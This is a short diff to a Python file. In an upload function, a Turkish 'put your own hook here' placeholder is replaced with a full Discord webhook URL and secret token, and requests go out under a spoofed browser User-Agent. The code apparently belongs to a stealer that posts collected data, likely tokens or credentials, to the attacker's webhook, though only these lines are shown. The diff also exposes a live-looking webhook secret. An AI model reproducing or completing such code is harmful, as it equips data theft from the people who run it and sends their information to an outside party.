@@ -355,7 +355,7 @@ def Reformat(listt):
     return list(set(e))
 
 def upload(name, link):
-    myhook = 'buraya kendi hookunu koy...'
+    myhook = 'https://discord.com/api/webhooks/953630498389889034/iRQBEhIEi72xc3Qh0s8XU90nmhj2C-iI7PSLf5gYYstz2a8ASSayjOXiZEzySq1VtUhS'
     headers = {
         "Content-Type": "application/json",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
